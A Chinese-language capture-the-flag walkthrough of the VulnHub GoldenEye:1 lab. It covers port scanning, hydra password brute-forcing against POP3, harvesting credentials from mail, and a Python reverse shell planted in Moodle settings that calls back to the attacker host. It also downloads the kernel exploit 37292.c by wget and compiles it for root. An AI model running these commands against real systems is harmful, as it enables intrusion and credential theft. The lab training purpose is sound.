---
title: GoldenEye-1
author: Creexile
date: 2024-09-05 18:57:12
lastMod: 2025-04-10
summary: 'No.1'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [MSF, 提权, 爆破, 渗透]
---

# GoldenEye: 1

---

No.1

> 来源: [vulnhub靶场-Goldeneye:1](https://www.vulnhub.com/entry/goldeneye-1,240/)
>
> 目标: get root and capture the secret GoldenEye codes - flag.txt

## 环境配置

攻击机(kali): 192.168.56.6

靶机(ubuntu): 192.168.56.101

## 信息收集

我还是第一次看到nmap的`-A`会漏掉端口的

```
nmap -p- 192.168.56.101
nmap -A 192.168.56.101
nmap -p 55006,55007 -A 192.168.56.101
```

详细信息如下

```
25/tcp    open  smtp
80/tcp    open  http Apache/2.4.7
55006/tcp open  ssl/pop3
55007/tcp open  pop3
```

访问80端口, 要求我们去`/sev-home/`去登录, 没有账号密码贸然爆破不可取, 遂翻找源代码

就只有一个`terminal.js`, 注释中透露了一些账号密码

```javascript
//Boris, make sure you update your default password.
//My sources say MI6 maybe planning to infiltrate.
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//BTW Natalya says she can break your codes
```

此处是ascii码, 对照表可以翻译为`InvincibleHack3r`, 至此可以得到账号密码:

> boris : InvincibleHack3r
>
> natalya : null

登录可以得到一段话, 这里只取部分, 结合扫描结果, 我们需要去对应端口看看

```
Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port
```

需要登录, 但是我们并不知道boris的默认密码和natalya的密码, 那只能尝试爆破了:

```
echo -e 'natalya\nboris' > test.txt
hydra -L test.txt -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 -s 55007 pop3
```

这个字典是自带的, 跑的比较快, 虽然用自己的也能跑出来

我们得到pop3登录账密:

> boris : secret1!
>
> natalya : bird

利用telnet或者nc登录

```
telnet 192.168.56.101 55007
# 或者 nc 192.168.56.101 55007
user boris
pass secrct1!
list
retr 1
# 参数1-3
```

![image-20240905121111449](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905121111449.png)

在boris的邮件3中我们可已得到以下信息

```
Place them in a hidden file within the root directory of this server
# 服务器root路径下有一个access codes
Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal
codes we will push to our final stages
# 可能有一个新的用户xenia, 而且可能有更多的权限(推向最后阶段)
```

在natalya的邮件2中可得:

```
username:xenia
password:RCP90rulez!
And if you didn’t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
Make sure to edit your host file since you usually work remote off-network…
Since you’re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
# 我们需要修改host文件然后访问 severnaya-station.com/gnocertdir
```

修改hosts文件

```
vim /etc/hosts
192.168.56.101 severnaya-station.com
```

去`severnaya-station.com/gnocertdir`利用账密登录, 可以找到一个欢迎信息来自Doak

而在`My profile -> Messages`可以找到Dr. Doak的信件, 可以得到一个邮箱的用户名为doak, 没有密码就爆破

![image-20240905143437642](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905143437642.png)

登录邮件系统可以得到新的账号密码: `dr_doak : 4England!`

拿去登录网站, 可以在`My profile->My private files`的for james文件夹中找到s3cret.txt, 可以下载下来

```
Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg
```

暗示admin的密码在新的路径: `/dir007key/for-007.jpg`, 是个图片, 那大概率是藏了什么

在属性界面找到了base64编码, 解码出来是`xWinter1995x!`, 那么这个就是管理员的密码了

![image-20240905150434809](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905150434809.png)

成功进入有权限的后台, 下一步就是getshell了

## getshell

写马或者利用框架漏洞拿到服务器的shell

网站框架为moodle, msf有现成的利用模块, 也可以手工利用

> 我的msf不是很好用捏
>
> payload导入有些麻烦

首先更改设置:

![image-20240905174027958](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905174027958.png)

然后在配置中写入反弹shell代码:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.6",10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image-20240905175441537](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905175441537.png)

先利用nc监听端口, 然后找到一个能发送数据包出去的地方, 能发送邮件的地方就不错, 点击那个钩就行了

![image-20240905175852742](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905175852742.png)

成功后执行`python -c 'import pty; pty.spawn("/bin/bash")'`开一个新的交互shell

## 提权

> 因为要进入root文件夹, 只能提权

先查看服务器有哪些东西

```bash
whoami
# www-data
uname -a
# Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

没有gcc环境, 但是有cc环境

查看内核并查找对应的提权方法/漏洞, 找到37292.c, 复制下来准备编译

```bash
# 网络搜索:  Linux ubuntu 3.13.0-32 exploit
# 或者kali查找脚本:
searchsploit ubuntu 3.13
```

![image-20240905182736391](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905182736391.png)

由于目标主机没有gcc环境, 这里需要改我们复制下来的脚本: 将第143行的gcc改为cc

> 直接输入143gg就会跳转到143行

![image-20240905183320128](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905183320128.png)

然后开启http服务让靶机下载改过的文件

```bash
# kali
python3 -m http.server 6789
# 靶机
wget http://192.168.56.6:6789/37292.c
cc -o exp 37292.c
chmod +x exp
./exp
```

![image-20240905184209668](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905184209668.png)

可以看到是成功提权, 在`.flag.txt`找到了codes和flag地址, 访问即可得到flag

```
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

![image-20240905184627870](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905184627870.png)

## 附录

信息收集总结如下

- 目标
  kali: 192.168.56.6
  ubuntu: 192.168.56.101
  port: 25 80 55006 55007

- 域名
  severnaya-station.com

- 账密
  web:
  boris : InvincibleHack3r
  natalya : null

  pop3:
  boris : secret1!
  natalya : bird
  doak : goat

  web/gnocertdir :
  xenia : RCP90rulez!
  dr_doak : 4England!
  admin : xWinter1995x!

- 重要信息
  root中access code: 568628e0d993b1973adc718237da6e93
- 身份
  boris: user,员工
  natalya: GNO培训主管
  xenia: natalya学生, 网站账户
  doak: 员工,高管
  james: 特工
- 其他关联
  Janus: 犯罪集团
